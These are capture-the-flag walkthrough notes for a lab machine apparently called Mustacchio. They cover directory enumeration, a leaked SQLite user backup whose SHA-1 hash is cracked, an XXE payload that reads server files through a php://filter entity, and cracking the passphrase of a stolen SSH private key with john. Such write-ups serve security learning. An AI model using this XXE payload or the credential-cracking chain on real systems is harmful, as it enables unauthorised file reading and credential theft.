```bash
┌──(kali㉿kali)-[~/Documents/thm/mustacchio/web/80/fuzz]
└─$ sudo dirsearch -u http://10.10.203.161 -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html -o `pwd`/root --format=simple
[sudo] password for kali: 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 30 | Wordlist size: 102219

Output File: /home/kali/Documents/thm/mustacchio/web/80/fuzz/root

Error Log: /usr/local/lib/python3.9/dist-packages/dirsearch/logs/errors-22-01-25_09-22-54.log

Target: http://10.10.203.161/

[09:22:54] Starting: 
[09:24:03] 200 -    3KB - /about.html                    
[09:25:23] 200 -    3KB - /blog.html                
[09:26:35] 200 -    1KB - /contact.html           
[09:26:53] 200 -    1KB - /custom/              
[09:26:53] 301 -  315B  - /custom  ->  http://10.10.203.161/custom/
[09:28:27] 301 -  314B  - /fonts  ->  http://10.10.203.161/fonts/
[09:28:27] 200 -    1KB - /fonts/  
[09:28:45] 200 -    2KB - /gallery.html         
[09:29:31] 403 -  278B  - /icons/               
[09:29:36] 200 -    6KB - /images/            
[09:29:36] 301 -  315B  - /images  ->  http://10.10.203.161/images/
[09:29:44] 200 -    2KB - /index.html          
[09:34:10] 200 -   28B  - /robots.txt              
[09:34:40] 403 -  278B  - /server-status        
[09:34:40] 403 -  278B  - /server-status/
                                                     
Task Completed
```

```bash
┌──(kali㉿kali)-[~/Documents/thm/mustacchio/web/8765/fuzz]
└─$ sudo dirsearch -u http://10.10.203.161:8765 -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html -o `pwd`/root --format=simple
[sudo] password for kali: 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 30 | Wordlist size: 102219

Output File: /home/kali/Documents/thm/mustacchio/web/8765/fuzz/root

Error Log: /usr/local/lib/python3.9/dist-packages/dirsearch/logs/errors-22-01-25_09-38-46.log

Target: http://10.10.203.161:8765/

[09:38:47] Starting: 
[09:40:46] 403 -  580B  - /assets/                       
[09:40:46] 301 -  194B  - /assets  ->  http://10.10.203.161:8765/assets/
[09:40:51] 301 -  194B  - /auth  ->  http://10.10.203.161:8765/auth/
[09:40:51] 403 -  580B  - /auth/        
[09:45:12] 302 -    2KB - /home.php  ->  ../index.php  
[09:45:37] 200 -    1KB - /index.php            
                                                     
Task Completed
```

- Found `users.bak` in `/custom/js/`

```bash
┌──(kali㉿kali)-[~/Documents/thm/mustacchio/web/80]
└─$ sqlite3 users.bak
SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
sqlite> 


┌──(kali㉿kali)-[~/Documents/thm/mustacchio/web/80]
└─$ sth --text "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b"

  _____                     _        _______ _           _          _    _           _
 / ____|                   | |      |__   __| |         | |        | |  | |         | |
| (___   ___  __ _ _ __ ___| |__ ______| |  | |__   __ _| |_ ______| |__| | __ _ ___| |__
 \___ \ / _ \/ _` | '__/ __| '_ \______| |  | '_ \ / _` | __|______|  __  |/ _` / __| '_ \
 ____) |  __/ (_| | | | (__| | | |     | |  | | | | (_| | |_       | |  | | (_| \__ \ | | |
|_____/ \___|\__,_|_|  \___|_| |_|     |_|  |_| |_|\__,_|\__|      |_|  |_|\__,_|___/_| |_|
        
https://twitter.com/bee_sec_san
https://github.com/HashPals/Search-That-Hash
https://twitter.com/Jayy_2004


1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Text : bulldog19
Type : SHA-1

```

- Found a set of credentials - `admin:bulldog19`
- Can input `XML` code - 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

- `XXE Injection` - 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=home.php"> ]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

- Can access `SSH` key for `barry` at `/home/barry/.ssh/id_rsa`

```bash
┌──(kali㉿kali)-[~/Documents/thm/mustacchio/web/8765]
└─$ /usr/share/john/ssh2john.py id_rsa > hash.txt

┌──(kali㉿kali)-[~/Documents/thm/mustacchio/web/8765]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
1g 0:00:00:01 26.75% (ETA: 10:00:33) 0.9900g/s 3968Kp/s 3968Kc/s 3968KC/s sandyvale..sandythuy
1g 0:00:00:03 DONE (2022-01-25 10:00) 0.2673g/s 3834Kp/s 3834Kc/s 3834KC/sa6_123..*7¡Vamos!
Session completed
```

- Passphrase for `id_rsa` - `urieljames`

